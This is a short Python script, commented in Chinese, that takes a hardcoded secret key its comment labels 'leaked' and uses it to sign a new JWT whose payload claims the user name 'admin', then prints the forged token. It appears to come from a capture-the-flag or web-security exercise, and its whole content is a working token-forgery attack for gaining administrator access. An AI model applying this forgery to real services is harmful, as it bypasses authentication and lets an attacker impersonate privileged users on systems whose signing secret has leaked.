import jwt

# 泄露的密钥
secret_key = "tanji_is_A_boy_Yooooooooooooooooooooo!"

# 载荷数据
payload = {
    "name": "admin"
}

# 生成JWT
new_token = jwt.encode(payload, secret_key, algorithm="HS256")
print("新生成的JWT:", new_token)